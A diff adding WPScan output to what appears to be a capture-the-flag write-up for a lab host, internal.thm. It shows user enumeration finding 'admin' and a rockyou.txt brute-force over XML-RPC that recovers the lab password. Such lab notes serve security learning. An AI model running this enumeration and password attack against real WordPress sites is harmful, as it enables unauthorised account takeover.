@@ -375,8 +375,32 @@ The script remains there, as with the tables-attack
 - WordPress  
   Wpscan  
    ```
-    $ wpscan --url http://internal.thm/blog -e vp,
+    $ wpscan --url http://internal.thm/blog -e vp,u
+    [+] Enumerating Vulnerable Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:01 <======================================> (10 / 10) 100.00% Time: 00:00:01
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
     $ wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
+[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - admin / my2boys                                                                                         
+Trying admin / kambal Time: 00:01:22 <                                     > (3900 / 14348292)  0.02%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: admin, Password: my2boys
 
     ```
 
